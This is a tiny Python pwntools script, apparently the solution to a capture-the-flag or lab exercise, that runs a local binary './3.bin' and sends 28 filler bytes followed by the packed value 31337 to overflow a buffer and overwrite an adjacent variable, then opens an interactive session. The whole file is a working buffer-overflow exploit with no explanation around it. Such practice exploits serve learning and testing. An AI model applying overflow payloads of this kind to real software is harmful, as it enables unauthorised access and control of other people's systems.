
from pwn import *

p = process("./3.bin")

p.send(b"A"*28 + p32(31337))

p.interactive()
